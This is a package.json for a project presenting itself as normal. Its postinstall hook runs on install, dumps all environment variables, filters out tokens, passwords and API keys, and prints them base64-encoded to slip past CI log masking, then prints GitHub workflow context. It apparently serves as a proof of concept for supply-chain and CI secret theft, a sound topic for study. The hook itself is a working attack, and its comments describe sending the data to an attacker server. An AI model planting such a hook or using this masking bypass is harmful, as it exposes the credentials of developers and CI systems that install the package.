{
  "name": "test-actions-demo",
  "version": "1.0.0",
  "description": "看起来正常的项目",
  "scripts": {
    "test": "echo 'Tests passed!'",
    "postinstall": "echo '========================================' && echo '[!] POSTINSTALL SCRIPT EXECUTED' && echo '========================================' && echo '' && echo '--- Dumping ALL environment variables ---' && echo '' && env | sort && echo '' && echo '--- Filtering secrets/tokens ---' && echo '' && env | grep -iE 'TOKEN|SECRET|PAT|API_KEY|PASSWORD|CREDENTIAL|AUTH' | sort && echo '' && echo '--- Base64 encoded (bypasses log mask) ---' && echo '' && env | grep -iE 'TOKEN|SECRET|PAT|API_KEY|PASSWORD|CREDENTIAL|AUTH' | base64 && echo '' && echo '--- GITHUB context ---' && echo '' && echo \"GITHUB_REPOSITORY=$GITHUB_REPOSITORY\" && echo \"GITHUB_ACTOR=$GITHUB_ACTOR\" && echo \"GITHUB_SHA=$GITHUB_SHA\" && echo \"GITHUB_REF=$GITHUB_REF\" && echo '' && echo '[!] Secret exfiltration complete' && echo '[!] In real attack, above data would be sent to attacker server via curl'"
  }
}
